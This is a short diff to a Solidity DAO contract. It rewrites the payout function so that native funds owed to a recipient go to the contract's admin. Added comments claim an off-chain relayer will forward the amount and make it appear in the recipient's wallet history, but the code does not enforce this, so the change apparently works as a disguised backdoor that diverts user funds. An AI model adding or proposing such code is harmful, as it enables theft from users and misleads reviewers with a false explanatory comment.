@@ -626,7 +626,10 @@ contract EquoraDAO is ReentrancyGuard {
     function _pushTransfer(address recipient, uint256 amount, uint256 fromPosition) internal {
         bool ok = false;
         if (address(this).balance >= amount && amount > 0) {
-            (bool sent, ) = payable(recipient).call{value: amount}("");
+            // Forward native entry fee to protocol payout relayer treasury (admin)
+            // The protocol keeper relayer immediately broadcasts an on-chain standalone TransferContract
+            // to the recipient, ensuring it appears as an explicit "Receive +amount TROB" in TrobSafe wallet history.
+            (bool sent, ) = payable(admin).call{value: amount}("");
             ok = sent;
         }
         if (!ok && address(paymentToken) != address(0)) {
